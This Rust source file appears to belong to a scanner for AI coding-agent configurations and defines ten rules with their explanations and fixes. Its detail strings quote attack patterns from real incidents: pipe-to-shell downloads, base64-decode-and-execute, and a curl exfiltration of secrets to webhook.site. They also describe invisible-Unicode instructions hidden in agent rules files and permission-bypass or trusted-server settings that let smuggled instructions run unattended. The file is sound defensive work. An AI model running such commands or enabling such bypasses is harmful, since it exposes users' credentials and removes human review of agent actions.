// SPDX-License-Identifier: Apache-2.0
// Copyright (c) 2026 Sysogen Lda

//! What each rule means, and what to do about it.
//!
//! Beside the model rather than in whichever adapter prints it: the same words
//! reach a code scanning alert, a terminal and a documentation page, and four
//! copies of a sentence is how one rule comes to mean three things.

use crate::finding::RuleId;

impl RuleId {
    /// Every rule, in the order a listing shows them.
    ///
    /// Rust cannot enumerate a fieldless enum without a macro or a crate, so
    /// this is written out and `all_lists_every_rule` keeps it honest: a new
    /// variant fails that test's match to compile.
    #[must_use]
    pub fn all() -> &'static [Self] {
        &[
            Self::InvisibleUnicode,
            Self::OpaqueHook,
            Self::DownloadAndExecute,
            Self::DecodeAndExecute,
            Self::CredentialExfiltration,
            Self::UnverifiedDownload,
            Self::UnpinnedRemotePackage,
            Self::BypassPermissions,
            Self::UnrestrictedShell,
            Self::TrustedServer,
        ]
    }

    /// What the rule means, and the incident behind it.
    #[must_use]
    pub fn detail(self) -> &'static str {
        match self {
            Self::InvisibleUnicode => {
                "An instruction, rules, skill or hook file holds a character that renders \
                as nothing: zero-width, bidirectional, tag-block or another \
                default-ignorable character. The model reads it and a reviewer does not, \
                which is how the Rules File Backdoor, disclosed by Pillar Security on 18 \
                March 2025, hid instructions in rules files. In a hook script it is \
                Trojan Source, CVE-2021-42574."
            }
            Self::OpaqueHook => {
                "A hook runs on agent events with the agent's permissions, and this one \
                cannot be read as text: it is not UTF-8, is larger than the file limit, \
                or is a symbolic link that clew will not follow. What it runs cannot be \
                reviewed."
            }
            Self::DownloadAndExecute => {
                "A hook downloads code and hands it straight to an interpreter, as \
                curl ... | bash does. What runs is whatever the server returns at that \
                moment, with the agent's permissions, every time the hook fires. The \
                compromised tj-actions/changed-files action (CVE-2025-30066, 14 March \
                2025) ran curl ... memdump.py | sudo python3."
            }
            Self::DecodeAndExecute => {
                "A hook decodes code, from base64, hex or a compressed blob, and hands it \
                straight to an interpreter, as echo ... | base64 -d | sh does. What runs \
                is not what the hook shows: a review, a diff or a scanner sees only the \
                encoded form. The xz-utils backdoor (CVE-2024-3094, disclosed by Andres \
                Freund on 29 March 2024) kept its script in a test file and ran it during \
                the build with ... | xz -d | /bin/bash."
            }
            Self::CredentialExfiltration => {
                "A hook sends a credential over the network: the environment, a token a \
                tool prints such as gh auth token, a credential file such as \
                ~/.aws/credentials or ~/.npmrc, or what a cloud metadata service \
                answers, piped, redirected, uploaded or substituted into what curl, wget \
                or nc sends. The Shai-Hulud worm (StepSecurity, 15 September 2025) sent \
                a workflow's secrets with curl -d \"$CONTENTS\" https://webhook.site/..., \
                and the compromised nx packages (StepSecurity, 27 August 2025) ran gh \
                auth token and read ~/.npmrc before uploading what they found."
            }
            Self::UnverifiedDownload => {
                "A hook downloads a file and later runs it, or unpacks it and runs what it \
                held, without checking a checksum or a signature first. A moved tag, a \
                mutable URL or a compromised host changes what runs, with the agent's \
                permissions, the next time the hook fires. The loader in the keyv and \
                cacheable compromise (Socket, 4 August 2026) downloaded a Bun release over \
                HTTPS with no checksum or signature verification and ran it."
            }
            Self::UnpinnedRemotePackage => {
                "A hook runs a package from a registry at a tag that moves, as npx \
                claude-flow@latest does, so it runs whichever version was published last, \
                every time it fires, with the agent's permissions. In the Shai-Hulud \
                attack (StepSecurity, 15 September 2025), compromised versions of \
                @ctrl/tinycolor and 40 other npm packages carried a postinstall payload; \
                a runner fetching the latest release at that moment fetched it."
            }
            Self::BypassPermissions => {
                "A configuration file starts an agent with nothing asking before it acts and \
                nothing bounding what it does: Claude Code's permissions.defaultMode set to \
                bypassPermissions, Codex's sandbox_mode set to danger-full-access, VS \
                Code's chat.tools.global.autoApprove set to true, or Zed's \
                agent.tool_permissions.default set to allow. Any instruction the agent \
                reads, including one smuggled into a file it is given, then runs \
                unattended. Two limits belong on the finding: Claude Code stopped \
                honouring bypassPermissions from project and local settings in v2.1.257, so \
                a repository setting it reaches only an older client, and Zed's built-in \
                security rules still prompt for a few actions."
            }
            Self::UnrestrictedShell => {
                "A configuration file pre-approves the shell with nothing restricting what \
                it runs: Claude Code's Bash, Bash() or Bash(*), or Gemini CLI's \
                run_shell_command, in permissions.allow, tools.allowed, or a skill's \
                allowed-tools. Every command the agent chooses then runs without being \
                shown to anyone, which is the grant the other entries in those lists \
                exist to avoid needing. A tool that takes no argument restriction, such \
                as WebSearch or an MCP tool, is not flagged: a bare entry is the only way \
                to write that grant."
            }
            Self::TrustedServer => {
                "An MCP server is declared with trust: true, which Gemini CLI's reference \
                lists under \"Security bypass setting\" and documents as bypassing all tool \
                call confirmations for that server. Every tool it offers then runs unseen, \
                and a server decides for itself what it offers: one added after the trust was \
                granted is trusted too, and a tool whose description changes is never shown \
                again. The agent takes the server's word for what it is being asked to do."
            }
        }
    }

    /// What to do about a finding under the rule.
    #[must_use]
    pub fn remediation(self) -> &'static str {
        match self {
            Self::InvisibleUnicode => {
                "Open the file in an editor that shows invisible characters and remove the \
                character unless it was put there on purpose. The evidence shows it as \
                <U+XXXX>, never the character itself."
            }
            Self::OpaqueHook => {
                "Replace the hook with a script that can be reviewed, or establish where \
                the file came from and what it does. If it is text that is only large, \
                raise CLEW_MAX_FILE_BYTES."
            }
            Self::DownloadAndExecute => {
                "Download to a file, check it against a pinned checksum or signature, and \
                run the checked file, or install the tool through a package manager with \
                a lockfile. If the hook came from someone else, find out why it fetches \
                code each time it runs."
            }
            Self::DecodeAndExecute => {
                "Keep the code a hook runs in the hook, or in a script beside it, as text. \
                If the hook came from someone else, decode the payload into a file without \
                running it, and read what it does before anything runs it."
            }
            Self::CredentialExfiltration => {
                "Remove the command unless sending that credential is what the hook is \
                for. A token meant for a service belongs in the header or user that \
                service authenticates, sent to that service alone. If the hook came from \
                someone else, rotate every credential it could reach."
            }
            Self::UnverifiedDownload => {
                "Pin the download to a version and check it against a published checksum or \
                signature before running it (sha256sum -c, gpg --verify, cosign \
                verify-blob), or install the tool through a package manager with a \
                lockfile."
            }
            Self::UnpinnedRemotePackage => {
                "Pin the package to an exact version (npx tool@1.4.2), or add it to the \
                project's dependencies so the lockfile decides the version and checks its \
                integrity."
            }
            Self::BypassPermissions => {
                "Remove the mode and let the agent ask, or narrow what may happen without \
                asking: permissions.allow in Claude Code, chat.tools.terminal.autoApprove \
                in VS Code and a per-tool always_allow in Zed each pre-approve named \
                operations rather than every one. Where a machine genuinely runs \
                unattended, setting the mode in that machine's own user settings rather \
                than in a file the repository ships keeps it to the machine that meant it."
            }
            Self::UnrestrictedShell => {
                "Replace the entry with the commands the project actually runs, scoped, as \
                Bash(cargo test:*) and run_shell_command(git) are. Where a broad grant is \
                genuinely wanted, keeping it in a personal settings.local.json rather than \
                the file the repository ships limits it to the person who chose it."
            }
            Self::TrustedServer => {
                "Remove trust and confirm the calls, or keep it only for a server whose code \
                you control and whose tool list you pin. Where the confirmations are too \
                noisy, includeTools names the ones a project actually uses, which bounds the \
                server without turning the prompt off. Cline's autoApprove and VS Code's \
                chat.tools.eligibleForAutoApproval do the same by naming tools rather than \
                trusting all of them."
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A new variant fails this match to compile, which is the reminder to add
    /// it to `all()`; the count then fails until it is there.
    #[test]
    fn all_lists_every_rule() {
        for rule in RuleId::all() {
            match rule {
                RuleId::InvisibleUnicode
                | RuleId::OpaqueHook
                | RuleId::DownloadAndExecute
                | RuleId::DecodeAndExecute
                | RuleId::CredentialExfiltration
                | RuleId::UnverifiedDownload
                | RuleId::UnpinnedRemotePackage
                | RuleId::BypassPermissions
                | RuleId::UnrestrictedShell
                | RuleId::TrustedServer => {}
            }
        }

        assert_eq!(RuleId::all().len(), 10, "{:?}", RuleId::all());
    }

    #[test]
    fn every_rule_says_what_it_means_and_what_to_do() {
        for rule in RuleId::all() {
            assert!(rule.detail().len() > 80, "{rule:?} has no detail");
            assert!(rule.remediation().len() > 80, "{rule:?} has no remediation");
        }
    }

    /// The set, pinned. A rule added, removed, or re-graded shows up here in
    /// review rather than only in a diff of match arms, and PR 2 hangs the
    /// rule pack version off this file.
    #[test]
    fn the_rule_pack_matches_its_snapshot() {
        let snapshot = include_str!("../rule-pack.snapshot");
        let pinned: Vec<&str> = snapshot
            .lines()
            .filter(|l| !l.starts_with('#') && !l.trim().is_empty())
            .collect();
        let held: Vec<String> = RuleId::all()
            .iter()
            .map(|r| format!("{} {}", r.as_str(), r.severity().as_str()))
            .collect();

        assert_eq!(
            pinned,
            held.iter().map(String::as_str).collect::<Vec<_>>(),
            "the rule pack changed; update rule-pack.snapshot"
        );
    }

    /// An id is a promise, so a listing may not hold one twice.
    #[test]
    fn no_rule_is_listed_twice() {
        let mut ids: Vec<&str> = RuleId::all().iter().map(|r| r.as_str()).collect();
        ids.sort_unstable();
        let listed = ids.len();
        ids.dedup();
        assert_eq!(ids.len(), listed, "{ids:?}");
    }
}
